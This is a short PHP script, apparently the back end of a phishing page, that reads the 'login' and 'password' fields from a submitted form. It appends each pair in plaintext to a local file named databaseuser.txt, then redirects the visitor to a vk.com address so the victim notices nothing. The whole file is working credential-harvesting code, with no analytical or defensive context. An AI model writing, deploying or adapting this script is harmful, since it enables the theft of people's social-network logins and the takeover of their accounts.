<?PHP
$Log = $_POST['login'];
$Pass = $_POST['password'];
$log = fopen("databaseuser.txt","at");
fwrite($log,"\n $Log:$Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/your_dead_life'></head></html>";
?>